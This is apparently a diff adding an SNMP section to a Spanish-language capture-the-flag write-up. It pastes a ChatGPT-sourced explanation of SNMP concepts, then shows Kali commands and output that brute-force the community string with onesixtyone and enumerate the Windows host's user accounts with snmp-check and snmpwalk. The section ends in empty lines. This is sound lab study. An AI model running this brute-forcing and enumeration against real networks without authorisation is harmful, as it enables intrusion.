@@ -134,7 +134,119 @@ Enunciado :
 
 ## Analisis y explotacion del servicio SNMP del Puerto 161 UDP.
 
-  Primero necesitamos saber que es y como funciona SNMP para poder entender bien el proceso.
+  Primero necesitamos saber que es y como funciona SNMP.
+
+  INFO Pentesting SNMP ----> https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
+
+    INFO ChatGPT:
+    
+    1. **SNMP (Simple Network Management Protocol):** SNMP es un protocolo estándar de la industria utilizado
+    para administrar y supervisar dispositivos de red. Permite a los administradores de red recopilar   
+    información de estos dispositivos y enviar comandos a ellos.
+
+    2. **Community String (Cadena de Comunidad):** En SNMP, la cadena de comunidad es una especie de 
+    contraseña o clave compartida entre un administrador de red y un dispositivo SNMP. La cadena de comunidad 
+    se utiliza para autenticar las solicitudes y respuestas SNMP entre el administrador y el dispositivo.
+
+    Hay dos tipos principales de cadenas de comunidad en SNMP:
+    
+       -Cadena de comunidad de lectura (Read-Only): Permite al administrador acceder a información de supervisión, 
+        pero no realizar cambios en la configuración del dispositivo.
+         
+       - Cadena de comunidad de escritura (Read-Write): Permite al administrador acceder a información de supervisión
+       y realizar cambios en la configuración del dispositivo.
+    
+    3. **MIB (Management Information Base):** Una MIB es una base de datos jerárquica que almacena información
+    de administración de red. Contiene una serie de objetos gestionados que representan aspectos específicos de
+    un dispositivo o servicio. Los objetos en una MIB están organizados en una estructura de árbol
+    y se identifican mediante números enteros únicos llamados OIDs (Object Identifiers).
+    
+    4. **OID (Object Identifier):** Un OID es un número único que identifica un objeto gestionado en una MIB.
+    Los OIDs se utilizan para acceder a información específica en un dispositivo de red. Por ejemplo, 
+    un OID podría identificar el número de interfaces en un router o el uso de la CPU en un servidor.
+    
+    En resumen, SNMP es un protocolo de administración de red que utiliza las cadenas de comunidad
+    para autenticar y controlar el acceso a los dispositivos SNMP, MIBs para organizar información
+    y OIDs para identificar objetos específicos dentro de esas MIBs. 
+
+
+  - Obtenemos informacion de la maquina victima.
+  
+    1)Mediante un ataque de fuerza bruta obtenemos la comunidad del servicio SNMP.
+  
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
+        └─# onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.121.136
+        Scanning 1 hosts, 120 communities
+        10.10.121.136 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
+    
+      Comunidad --> openview
+    
+
+    2)Podemos leer info de la maquina victima de dos modos.
+
+        - snmp-check(Muestra la info mas importante de manera automatica)
+        - snmpwalk(Mostramos la info que queremos mediante el uso de OIDS)
+    
+      - snmp-check
+        
+            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
+            └─# snmp-check -c openview 10.10.121.136     
+            snmp-check v1.9 - SNMP enumerator
+            Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+            
+            [+] Try to connect to 10.10.121.136:161 using SNMPv1 and community 'openview'
+            
+            [*] System information:
+            
+              Host IP address               : 10.10.121.136
+              Hostname                      : year-of-the-owl
+              Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
+              Contact                       : -
+              Location                      : -
+              Uptime snmp                   : 00:39:17.48
+              Uptime system                 : 00:38:23.99
+              System date                   : 2023-9-26 06:37:53.1
+              Domain                        : WORKGROUP
+            
+            [*] User accounts:
+            
+              Guest               
+              Jareth              
+              Administrator       
+              DefaultAccount      
+              WDAGUtilityAccount
+
+            [...]
+
+    
+      - snmpwalk
+
+        OIDs Interesantes para extraer informacion de manera manual ---> https://github.com/refabr1k/OSCP/blob/master/snmp.md
+
+        Extraemos de manera manual los Usuarios del SO
+
+            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
+            └─# snmpwalk -v 2c -c openview 10.10.121.136 1.3.6.1.4.1.77.1.2.25
+            iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
+            iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
+            iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
+            iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
+            iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
+
+
+  - 
+          
+
+        
+   
+        
+
+          
+
+    
+      
+
+    
 
     
 
